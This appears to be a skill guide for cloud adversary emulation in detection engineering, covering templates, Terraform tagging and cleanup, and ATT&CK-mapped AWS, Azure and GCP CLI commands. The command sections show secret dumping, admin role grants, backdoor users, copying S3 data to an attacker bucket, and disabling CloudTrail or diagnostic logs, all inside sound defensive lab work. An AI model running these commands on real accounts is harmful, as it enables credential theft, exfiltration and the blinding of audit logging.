# Cloud Emulation Guide

Templates and cloud-specific patterns for the skill lifecycle. Drive the run with
`emulation-run`; load this file when the harness `read` field points here (approved
through executing, covering, cleaning). Fill in this order: cover sheet → type →
adversary → victim / environment → operational flow. After the run: coverage evaluation
→ write-up. Planning contract: [engagement-planning.md](engagement-planning.md).
Optional private hooks: [internal-hooks.md](internal-hooks.md).

## Cover sheet

Fill this first, then the templates below in lifecycle order. Depth scales with type: Atomic can be thin; Full must be complete.

```text
Emulation Name:
Date:
Objective: [the detection-engineering question this run answers]
Mode: [Intelligence-driven | Rule-driven | Coverage-driven | Conceptual | Tool-driven]
Emulation Type: [Atomic | Micro | Full]
Source URL (intelligence-driven — required): [https://...]
Source Material: [URL | Detection Rule path/URL | ATT&CK/data-source gap | pinned tool+technique | "Conceptual — ..."]
Cloud Provider(s):
Target Services:
Starting foothold: [stolen long-term credentials | assumed/escalated role | compromised compute]
Starting identity (provider-specific):
  AWS:   [IAM user | assumed role | instance profile | SSO session]
  Azure: [user principal | service principal | managed identity]
  GCP:   [user account | service account | instance SA]

Threat Model:
  Adversary Profile: [filled | thin — Atomic]
  Victim Profile: [filled | thin — Atomic]
  Environment Architecture & Posture: [filled | thin — Atomic]

Operational Flow: [see template — required before checkpoint]
```

## Emulation Type Template

Pick the question (mode) first, then the depth (type). Type controls how wide you cast the net, not whether you skip the rest of the lifecycle.

| Type       | Scope                                                                 | Approval                         | Typical use                                      |
| ---------- | --------------------------------------------------------------------- | -------------------------------- | ------------------------------------------------ |
| **Atomic** | One technique, one clear signal question. Thin environment is fine.   | Implicit if rule-driven          | Validate a single rule or one API signal         |
| **Micro**  | Short planned chain. Can pull in other resources (discover → stage → exfil). | Implicit                   | Small multi-step cloud behaviors                 |
| **Full**   | Larger scope. End-to-end at times; multiple planes and surfaces.      | Explicit engineer approval       | Intelligence-driven campaign replay              |

```text
Emulation Type: [Atomic | Micro | Full]

Justification:
  Why this type (not the adjacent ones):

In scope:
  Tactics:
  Techniques:
  API calls / procedures:

Out of scope:
  - [tactic, technique, or action we will NOT execute, and why]

Stop condition:
  [single technique complete | chain complete | campaign complete | engineer halt]

Infrastructure depth:
  [identity-only | identity + target resource | identity + network + compute]

Type constraints:
  Atomic: one technique, one signal question; unused threat-model depth can be thin.
  Micro:  short chain; may cross a tactic boundary if the chain requires it; ask before expanding.
  Full:   requires engineer approval at the checkpoint before provisioning.
```

## Adversary Profile Template

Fill in Step 2. Intelligence-driven: source every field from the research — mark anything inferred. Rule-driven / coverage-driven: infer from the query, data source, and ATT&CK mapping. Conceptual: mark assumptions.

```text
Adversary Profile:
  Name / alias: [group, unattributed, or conceptual persona]
  Motivation: [espionage | financial | disruption | hacktivism | insider]
  Sophistication: [opportunistic | targeted | APT-level]
  Cloud fluency: [native APIs / living off the land | custom tooling]

Initial access:
  Vector: [stolen keys | phishing | compromised compute | supply chain | other]
  Foothold: [stolen long-term credentials | assumed/escalated role | compromised compute]
  Identity (provider-specific): [IAM user | assumed role | instance profile | SSO session | user principal | service principal | managed identity | user account | service account | instance SA]
  Initial permissions: [what they have at foothold — not admin unless the scenario says so]

Objectives:
  - [persist | escalate | exfiltrate | disrupt | ...]

Known / inferred behaviors:
  1. [concrete API + identity + target + outcome] → T#### — [source: URL §X / rule query / inferred]
  2. ...

Would NOT do:
  - [actions inconsistent with this adversary — do not emulate these]

Assumptions:
  - [assumption] — [source: report §X / rule metadata / inferred]
```

## Victim Modeling Template

Fill in Step 3 with Environment Architecture & Posture. Intelligence-driven: source every field from the research — mark anything inferred. Do not invent victim details that make the demo easier. Rule-driven / coverage-driven: derive what you can from the query and fields; expect to infer the rest. Conceptual: mark assumptions.

```text
Emulation Name:
Source Material: [URL | Rule path/URL | gap | "Conceptual — ..."]

Victim Profile:
  Sector: [e.g., Financial services, Government, Healthcare, Technology]
  Company size/type: [SMB | Mid-market | Enterprise | Government agency]
  Cloud maturity: [Early-stage | Intermediate | Advanced]
  Region/compliance: [e.g., US/FedRAMP, EU/GDPR, multinational]
  Targeted user roles: [e.g., IT admin, developer, finance, executive]
  Targeted resources: [e.g., S3 buckets, Key Vault, Entra ID, CI/CD]

Environmental Assumptions:
  (For each, cite source or mark as inferred)
  - [Assumption] — [source: report §X / cloud default since YYYY / inferred]
  - ...

Plausibility Checklist:
  Identity & Access:
    - [ ] Conditional access / MFA: Would sign-in succeed?
    - [ ] OAuth scopes / token type: Delegated vs app? Admin consent needed?
    - [ ] Role trust / SCP / org policy: Would assume-role or API call be allowed?
  Data & Resources:
    - [ ] Encryption at rest: Default SSE? KMS? Does attacker have key access?
    - [ ] Network controls: Private endpoints, VPC endpoints, NSGs blocking public access?
    - [ ] Resource state: Is data where attacker expects it?
  Detection Posture:
    - [ ] Audit logging level: Management only or data events too?
    - [ ] SIEM forwarding: Active or cold storage only?
    - [ ] Cloud-native detection: GuardDuty / Defender / SCC enabled?

Step-by-step Plausibility:
  Step 1: [action] — [plausible | plausible with caveat | requires prerequisite]
  Step 2: [action] — ...
```

## Environment Architecture & Posture Template

Fill in Step 3. This is what we provision — not a generic "hardened" lab, and not a silently permissive one. Replicate what the source describes; if the source is silent, pick the common default and mark it inferred.

Atomic: only the controls and resources the single technique touches. Micro/Full: enough topology that each in-scope step is environmentally plausible.

```text
Environment Architecture & Posture:
  Cloud provider / org structure: [single account | org/OU | tenant + mgmt groups | GCP project/folder]
  Region / data residency:

  Identity architecture:
    Human auth: [SSO / MFA / CA policies — present, absent, or bypassed how]
    Workload identities: [instance profiles, managed identities, IRSA, WIF]
    Guardrails: [SCPs, management group policies, org policies — would they deny this?]

  Network:
    Public vs private endpoints:
    Ingress restriction: [engineer IP only for any compute]
    Egress / exfil path: [public API | VPC endpoint | peering]

  Data protection:
    Encryption at rest: [SSE-S3 | SSE-KMS | CMK | Azure SSE | CMEK]
    Key access for the compromised identity: [yes | no | not required]
    Secrets location: [none | SM / Key Vault / Secret Manager]

  Logging & detection:
    Control-plane logging: [CloudTrail mgmt | Azure Activity | GCP Admin Activity]
    Data events: [on | off | unknown]
    SIEM forwarding: [live | cold storage only | unknown]
    Native detections: [GuardDuty / Defender / SCC — on | off | unknown]

  What we will provision to match this posture:
    -
  What we will NOT provision (and why):
    -
  Assumptions:
    - [assumption] — [source: report §X / cloud default since YYYY / inferred]
```

## Operational Flow Template

Fill in Step 4. Write the contextual version before any CLI. Each step names the actor, call, target, expected result (including deny), and the log that should capture it. Failures stay in the flow — a denied permission is often the trace a detection should chase.

```text
Operational Flow:
  Objective:
  Mode: [Intelligence-driven | Rule-driven | Coverage-driven | Conceptual | Tool-driven]
  Type: [Atomic | Micro | Full]
  Starting identity: [foothold type and permissions at step 1]

  Step N:
    Action (contextual — not a tactic label):
    Actor / identity:
    API call(s):
    Target resource:
    Expected result: [success | denied | artifact that unlocks step N+1]
    Expected telemetry: [data stream + fields]
    If it fails, next move:

  Telemetry on before execute:
    - [stream]: [on | need to enable | not in scope]
```

Vague vs contextual (write the second kind):

- Vague: "Initial access via user logging in." Contextual: browser to `login.microsoftonline.com`, MFA with Entra as IdP, code shared over Teams, no CA broken, code exchanged for a refresh token.
- Vague: "Exfiltrate data from S3." Contextual: EC2 instance-profile foothold, `ListBucket`/`GetObject` on a named bucket, SSE-KMS plus `kms:Decrypt`, staging prefix then `PutObject` to an external bucket, data events on.

## Coverage Evaluation Template

Fill in Step 8 after verifying raw events (Step 7). Score what fired against this telemetry, not the ATT&CK board.

```text
Coverage Evaluation:
  Events used: [index pattern + emulation-tag filter]
  Logging confirmed on: [streams]

  Rule outcomes:
    - [rule name / id]: [right reason | different link in chain | brittle / accidental | inventory only]
      Query actually matches: [yes — fields | no — never touches this telemetry]
      Notes:

  Invisible / missing telemetry:
    - [step]: [late | partial | absent] — [finding]

  Distinguishes attacker from normal?: [yes | no | unknown — why]

  Next move (engineer decision):
    - [new rule | tune | request missing log | hunt | investigate before changing anything]
```

### Plausibility assessment examples

These belong with Step 3 (victim / environment). They show the kind of reasoning those templates should capture — not to block emulation steps, but to keep the provisioned environment realistic and documented.

**Azure — OAuth token and Graph API access:**

> The adversary uses a service principal with `client_credentials` grant to call Microsoft Graph.
>
> - `.default` scope on `https://graph.microsoft.com` grants all _application_ permissions consented to the SP — not all Graph permissions.
> - If the report says "accessed user mailboxes," the SP needs `Mail.Read` as an application permission with admin consent. Provisioning must include this consent, not just the API permission declaration.
> - Conditional access policies scoped to "All cloud apps" would evaluate this sign-in. If the tenant enforces device compliance or named locations for service principals, the emulation would fail unless the policy excludes the SP or the emulation accounts for this.

**AWS — S3 object encryption and access:**

> The adversary exfiltrates S3 objects from a production bucket.
>
> - Since January 2023, all new S3 buckets have SSE-S3 encryption by default. If the report predates this, the bucket may be unencrypted; if it post-dates, assume SSE-S3 at minimum.
> - SSE-S3 is transparent to any principal with `s3:GetObject` — no additional KMS permissions needed. But if the victim uses SSE-KMS, the compromised role needs `kms:Decrypt` on the key.
> - If the bucket has a bucket policy restricting access to a VPC endpoint (`aws:sourceVpce`), the adversary cannot exfiltrate via the public S3 API. The report should describe how the adversary obtained VPC-internal access.
> - Document: "Assuming SSE-S3 (AWS default). Source does not specify KMS. Bucket policy allows IAM-authenticated access (no VPC endpoint restriction mentioned in report)."

**Azure — Conditional access and MFA:**

> The adversary signs in with stolen credentials to access Azure resources.
>
> - Most enterprise Entra ID tenants enforce MFA for all users. If the report describes password-only sign-in, either: (a) MFA was bypassed via token theft (PRT, refresh token), (b) the account had an MFA exclusion, or (c) the victim had weak CA policies.
> - If the report says "device code phishing" — this bypasses device compliance CA policies because the token is obtained on the attacker's device but used server-side.
> - Document the specific CA bypass mechanism. Do not silently provision a tenant without MFA.

**GCP — API enablement and service account permissions:**

> The adversary enumerates GCP resources using a compromised service account.
>
> - GCP APIs are not enabled by default. If the adversary calls `compute.instances.list`, the Compute Engine API must be enabled on the project.
> - The research should indicate which APIs were available. For conceptual emulations, enable only APIs that would realistically be active for the victim's workload (e.g., a data analytics company would have BigQuery and GCS enabled, likely not GKE).
> - Service account key-based authentication generates `ServiceAccountKey` audit log entries, which are flagged by Security Command Center. Document this detection likelihood.

## Identity Models

### AWS Identity Types

| Identity              | Use when                                 | Setup                                       |
| --------------------- | ---------------------------------------- | ------------------------------------------- |
| IAM user              | Simulating stolen long-term credentials  | `aws iam create-user` + `create-access-key` |
| Assumed role          | Simulating lateral movement / escalation | `aws sts assume-role`                       |
| Instance profile role | Simulating compromised EC2               | Attach role to EC2, exec from instance      |
| SSO session           | Simulating stolen SSO/IdP token          | `aws sso login` with emulation profile      |

### Azure Identity Types

| Identity          | Use when                           | Setup                            |
| ----------------- | ---------------------------------- | -------------------------------- |
| Service principal | Simulating compromised app/service | `az ad sp create-for-rbac`       |
| Managed identity  | Simulating compromised VM/resource | Assign to VM, exec from instance |
| User principal    | Simulating stolen user credentials | Create test user in Entra ID     |

### GCP Identity Types

| Identity        | Use when                           | Setup                                         |
| --------------- | ---------------------------------- | --------------------------------------------- |
| Service account | Simulating compromised service     | `gcloud iam service-accounts create`          |
| User account    | Simulating stolen user credentials | Use test account with scoped permissions      |
| Instance SA     | Simulating compromised compute     | Attach SA to GCE instance, exec from instance |

## Terraform Patterns

### Safe teardown rules

Always ensure infrastructure can be destroyed cleanly.

Prefer short-lived credentials. Provision principals and least-privilege policies with
Terraform; issue access keys, passwords, or SA key files **after** apply into
`$RUN_DIR/secrets` (mode `0600`) only when the scenario requires a durable stolen
credential. Never put secrets in Terraform outputs or state.

The `emulation_tag` variable (e.g., `void-blizzard-a3f8c1`) must be embedded in every resource name and tag. This makes log filtering, cleanup verification, and concurrent emulation runs reliable.

```hcl
variable "emulation_tag" {
  description = "Unique emulation identifier: <name>-<random-hex> (e.g., void-blizzard-a3f8c1)"
  type        = string
}

# AWS S3 — force_destroy + emulation tag in name and tags
resource "aws_s3_bucket" "target" {
  bucket        = "emul-data-${var.emulation_tag}"
  force_destroy = true

  tags = {
    emulation-tag  = var.emulation_tag
    emulation-date = timestamp()
    owner          = var.owner
  }
}

# AWS IAM — compromised identity with emulation tag in name
resource "aws_iam_user" "compromised" {
  name          = "emul-compromised-${var.emulation_tag}"
  force_destroy = true

  tags = {
    emulation-tag = var.emulation_tag
    owner         = var.owner
  }
}

# Azure — resource group named with emulation tag (single-command cleanup)
resource "azurerm_resource_group" "emulation" {
  name     = "rg-emul-${var.emulation_tag}"
  location = var.location

  tags = {
    emulation-tag  = var.emulation_tag
    emulation-date = timestamp()
    owner          = var.owner
  }
}

# GCP — labels with emulation tag components
resource "google_project" "emulation" {
  name       = "emul-${var.emulation_tag}"
  project_id = "emul-${var.emulation_tag}"
  org_id     = var.org_id

  labels = {
    emulation-tag = replace(var.emulation_tag, "-", "_")
    owner         = var.owner
  }
}
```

### Resource manifest output

Output a manifest that includes the emulation tag for cross-referencing:

```hcl
output "emulation_manifest" {
  value = jsonencode({
    emulation_tag  = var.emulation_tag
    provisioned_at = timestamp()
    resources = [
      # List all resource IDs/ARNs
    ]
  })
}
```

## Emulation Patterns by MITRE ATT&CK

### Discovery — Cloud Infrastructure Discovery (T1580)

**AWS:**

```bash
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,InstanceType]'
aws s3 ls
aws iam list-roles
aws lambda list-functions
aws rds describe-db-instances
```

**Azure:**

```bash
az vm list -o table
az storage account list -o table
az role assignment list --all -o table
az functionapp list -o table
```

**GCP:**

```bash
gcloud compute instances list
gcloud storage ls
gcloud iam roles list --project=$PROJECT_ID
gcloud functions list
```

### Credential Access — Unsecured Credentials (T1552)

**AWS — Secrets Manager / SSM enumeration:**

```bash
aws secretsmanager list-secrets
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
```

**Azure — Key Vault enumeration:**

```bash
az keyvault list -o table
az keyvault secret list --vault-name $VAULT_NAME -o table
az keyvault secret show --vault-name $VAULT_NAME --name $SECRET_NAME
```

**GCP — Secret Manager enumeration:**

```bash
gcloud secrets list
gcloud secrets versions access latest --secret=$SECRET_NAME
```

### Persistence — Account Manipulation (T1098)

**AWS — Create access key for persistence:**

```bash
aws iam create-access-key --user-name $TARGET_USER
aws iam attach-user-policy --user-name $TARGET_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Azure — Add credentials to service principal:**

```bash
az ad sp credential reset --id $SP_ID --append
az role assignment create --assignee $SP_ID --role "Contributor" --scope /subscriptions/$SUB_ID
```

**GCP — Create service account key:**

```bash
gcloud iam service-accounts keys create key.json --iam-account=$SA_EMAIL
gcloud projects add-iam-policy-binding $PROJECT_ID --member="serviceAccount:$SA_EMAIL" --role="roles/editor"
```

### Privilege Escalation — Cloud Accounts (T1078.004)

**AWS — Assume role chain:**

```bash
# First hop
CREDS=$(aws sts assume-role --role-arn arn:aws:iam::$ACCOUNT:role/RoleA --role-session-name hop1 --output json)
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')

# Verify identity
aws sts get-caller-identity
```

**Azure — Elevate to Global Admin (conceptual):**

```powershell
# Requires existing Privileged Role Administrator
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
$roleId = (Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'").Id
New-MgDirectoryRoleMember -DirectoryRoleId $roleId -DirectoryObjectId $targetUserId
```

### Exfiltration — Transfer Data to Cloud Account (T1537)

**AWS — Copy S3 data to external account:**

```bash
aws s3 cp s3://$VICTIM_BUCKET/sensitive-data/ s3://$ATTACKER_BUCKET/ --recursive
# Or via presigned URL
aws s3 presign s3://$VICTIM_BUCKET/sensitive-file --expires-in 3600
```

**Azure — Export storage blob:**

```bash
az storage blob download-batch -s $CONTAINER -d ./exfil --account-name $STORAGE_ACCOUNT --sas-token $SAS
```

### Defense Evasion — Impair Defenses: Disable Cloud Logs (T1562.008)

**AWS — Disable CloudTrail:**

```bash
aws cloudtrail stop-logging --name $TRAIL_NAME
aws cloudtrail delete-trail --name $TRAIL_NAME
```

**Azure — Delete diagnostic settings:**

```bash
az monitor diagnostic-settings delete --resource $RESOURCE_ID --name $DIAG_NAME
```

**GCP — Modify audit log config:**

```bash
# GCP audit logs are configured at the project level via IAM policy
# Adversary would modify the audit config to exclude certain services
gcloud projects get-iam-policy $PROJECT_ID --format=json > policy.json
# Modify auditConfigs in policy.json
gcloud projects set-iam-policy $PROJECT_ID policy.json
```

## Waiting and Polling Patterns

Some cloud operations require time to propagate. Use polling instead of fixed sleep:

```bash
# AWS — wait for instance to be running
aws ec2 wait instance-running --instance-ids $INSTANCE_ID

# AWS — wait for IAM propagation (no built-in waiter)
for i in $(seq 1 30); do
  aws sts get-caller-identity --profile emulation && break
  echo "Waiting for IAM propagation... ($i/30)"
  sleep 10
done

# Azure — wait for resource provisioning
az vm wait --name $VM_NAME --resource-group $RG --created

# GCP — wait for operation to complete
gcloud compute operations wait $OPERATION_NAME --zone=$ZONE
```

## Orphaned Resource Detection

After emulation, scan for all resources tagged with the emulation tag — anything still present after `terraform destroy` is orphaned:

```bash
# AWS — find all resources with emulation tag (provisioned + orphaned)
aws resourcegroupstaggingapi get-resources \
  --tag-filters Key=emulation-tag,Values=$EMULATION_TAG

# AWS — find IAM users/roles by name prefix
aws iam list-users --query "Users[?starts_with(UserName, 'emul-') && contains(UserName, '${EMULATION_ID}')]"

# Azure — check if emulation resource group still exists
az group show -n "rg-emul-${EMULATION_TAG}" 2>/dev/null && echo "ORPHANED: resource group still exists"

# GCP — find labeled resources
gcloud asset search-all-resources \
  --query="labels.emulation-id=${EMULATION_ID}" --project=$PROJECT_ID
```

## Emulation architecture patterns

### Multi-stage emulation structure

For complex attack chains, organize into discrete stages with explicit dependencies:

```text
Stage 1: Initial Access       → provides: webshell, foothold
Stage 2: Discovery            → requires: foothold → provides: environment_map
Stage 3: Credential Access    → requires: foothold → provides: stolen_creds
Stage 4: Persistence          → requires: stolen_creds → provides: backdoor_identity
Stage 5: Privilege Escalation → requires: backdoor_identity → provides: elevated_access
Stage 6: Actions on Objective → requires: elevated_access
Stage 7: Defense Evasion      → requires: elevated_access
```

Each stage declares what it requires and provides. This prevents out-of-order execution and makes the attack chain reproducible. Track stage state (pending → running → completed → failed) in a state file.

### Terraform output injection pattern

Decouple infrastructure from attack logic by passing Terraform outputs to the emulation script:

```hcl
# terraform/outputs.tf
output "compromised_access_key_id" {
  value     = aws_iam_access_key.compromised.id
  sensitive = true
}
output "compromised_secret_access_key" {
  value     = aws_iam_access_key.compromised.secret
  sensitive = true
}
output "target_bucket_name" {
  value = aws_s3_bucket.target.id
}
```

```bash
# emulate.sh — generate emulation ID, load outputs, and execute
EMULATION_ID=$(openssl rand -hex 3)
EMULATION_NAME="void-blizzard"
EMULATION_TAG="${EMULATION_NAME}-${EMULATION_ID}"

OUTPUTS=$(terraform -chdir=terraform output -json)
ACCESS_KEY=$(echo $OUTPUTS | jq -r '.compromised_access_key_id.value')
SECRET_KEY=$(echo $OUTPUTS | jq -r '.compromised_secret_access_key.value')
BUCKET=$(echo $OUTPUTS | jq -r '.target_bucket_name.value')

export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY

# Use emulation tag as STS session name for log traceability
aws sts assume-role \
  --role-arn $ROLE_ARN \
  --role-session-name ${EMULATION_TAG}
```

### Orphaned resource tracking pattern

Track resources the adversary creates during execution (not managed by Terraform). Name them with the emulation tag so they are identifiable in both the manifest and cloud logs:

```bash
# Initialize manifest with emulation tag
echo "{\"emulation_tag\": \"${EMULATION_TAG}\", \"orphaned_resources\": []}" > emulation-resources.json

# After creating a backdoor user — include emulation tag in the name
BACKDOOR_USER="emul-backdoor-${EMULATION_TAG}"
aws iam create-user --user-name $BACKDOOR_USER \
  --tags Key=emulation-tag,Value=${EMULATION_TAG}
jq --arg user "$BACKDOOR_USER" --arg type "iam_user" \
  '.orphaned_resources += [{"type": $type, "id": $user}]' \
  emulation-resources.json > tmp.json && mv tmp.json emulation-resources.json

# Cleanup reads the manifest and deletes by ID
for resource in $(jq -r '.orphaned_resources[] | select(.type == "iam_user") | .id' emulation-resources.json); do
  aws iam delete-user --user-name "$resource" 2>/dev/null || true
done
```

### Error-safe cleanup pattern

Wrap all cleanup in error handling so it runs even on emulation failure:

```bash
cleanup() {
  echo "[*] Starting cleanup for ${EMULATION_TAG}..."

  # 1. Clean orphaned resources first (not in Terraform state)
  if [ -f emulation-resources.json ]; then
    for resource in $(jq -r '.orphaned_resources[] | select(.type == "iam_user") | .id' emulation-resources.json); do
      aws iam delete-user --user-name "$resource" 2>/dev/null || true
    done
    # ... repeat for other orphaned resource types (access keys, SNS topics, etc.)
  fi

  # 2. Destroy Terraform infrastructure
  terraform -chdir=terraform destroy -auto-approve

  # 3. Verify nothing tagged with emulation tag remains
  REMAINING=$(aws resourcegroupstaggingapi get-resources \
    --tag-filters Key=emulation-tag,Values=${EMULATION_TAG} \
    --query 'ResourceTagMappingList[].ResourceARN' --output text)
  if [ -n "$REMAINING" ]; then
    echo "[!] WARNING: orphaned resources still exist: $REMAINING"
  else
    echo "[+] Cleanup verified — no resources with tag ${EMULATION_TAG} remain"
  fi
}

# Ensure cleanup runs on exit, error, or interrupt
trap cleanup EXIT

# ... emulation steps ...
```

### Emulation identity labeling

The emulation tag is the primary mechanism for distinguishing emulation resources from real ones. Apply it consistently:

- **Resource tags:** `emulation-tag = ${EMULATION_TAG}` on all provisioned and orphaned resources
- **Identity naming:** `emul-<role>-${EMULATION_TAG}` for all users/roles/SPs (e.g., `emul-compromised-void-blizzard-a3f8c1`, `emul-backdoor-void-blizzard-a3f8c1`)
- **STS session names:** `--role-session-name ${EMULATION_TAG}` — this appears in CloudTrail as `userIdentity.arn` containing the tag
- **Azure:** Resource group `rg-emul-${EMULATION_TAG}` — all resources scoped here
- **Lab user markers:** When creating test users (Okta, Entra ID), add profile markers (`department: emulation-lab`, `organization: emulation`, `costCenter: <emulation-id>`). Only delete users with ALL markers during cleanup to prevent accidental deletion of real accounts.

### Console output conventions

Use consistent prefixes for emulation output to make logs scannable:

- `[+]` — success (API call succeeded, resource created)
- `[-]` — failure (API call failed, expected error)
- `[*]` — informational (status update, waiting)
- `[!]` — warning (unexpected state, needs attention)
- Print expected CloudTrail/audit log filter at the end of each emulation step for validation

## Emulation Write-up Template

Use this template when producing the emulation report (Step 9). Keep assumptions. Date environmental claims.

```text
# Emulation Report: <Emulation Name>

Emulation Tag: <EMULATION_TAG>
Mode: <Intelligence-driven | Rule-driven | Coverage-driven | Conceptual | Tool-driven>
Emulation Type: <Atomic | Micro | Full>
Date: <date>
Cloud Provider: <AWS | Azure | GCP>
Source: <URL, rule path, gap, tool+technique, or "Conceptual — <description>">
Engineer: <name>

## Executive Summary

<2-3 sentence summary: what was emulated, what landed in telemetry, key outcome>

## Objective and scope

Question:
Mode:
Type:
In scope / out of scope:
Stop condition:

## Threat Model

### Adversary Profile
Adversary: <name or profile>
Motivation: <espionage, financial, disruption, etc.>
Initial access / identity: <vector and identity type>
ATT&CK Tactics: <list>
ATT&CK Techniques: <T#### — Name for each>

### Victim Profile
Sector: <sector>
Company type: <SMB | Enterprise | Government>
Cloud maturity: <Early-stage | Intermediate | Advanced>
Key assumptions:
  - <assumption> — <source>
  - ...

### Environment Architecture & Posture
Org structure: <account / tenant / project model>
Identity / guardrails: <MFA, CA, SCPs, org policies>
Network: <public vs private, exfil path>
Data protection: <encryption, key access>
Logging & detection: <control-plane, data events, native detections>

## Operational flow / timeline

| # | Timestamp | Action | API Call(s) | Identity Used | Result | Telemetry | Notes |
|---|-----------|--------|-------------|---------------|--------|-----------|-------|
| 1 | ...       | ...    | ...         | ...           | ...    | ...       | ...   |

## Observations

- What succeeded and why
- What failed and why (access denied, propagation delays, missing permissions, etc.)
- Unexpected cloud behaviors
- Credential progression actually taken (including loops and denies)

## Telemetry verification

- What appeared, what was late/partial/absent
- Fields confirmed from raw events
- Invisible techniques (finding)
- Distinguishes attacker from normal?: <yes | no | unknown>

## Detection coverage

| Rule | Outcome | Notes |
|------|---------|-------|
| ...  | right reason / other link / brittle / inventory only | ... |

Next move: <new rule | tune | request missing log | hunt | investigate>

## Infrastructure Summary

Provisioned resources: <count and types>
Orphaned resources created: <count and types>
Cleanup status: <complete | partial — details>
Estimated cost incurred: <if compute was used>

## Recommendations

- Detection gaps to address → hand off to rule-authoring
- Existing rule tuning opportunities → hand off to rule-tuning
- Follow-up emulations to consider
- Assumptions someone will need when this rule gets noisy
```
